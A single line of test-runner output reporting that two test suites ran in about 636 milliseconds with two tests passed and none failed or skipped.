Ran 2 test suites in 635.63ms (626.57ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
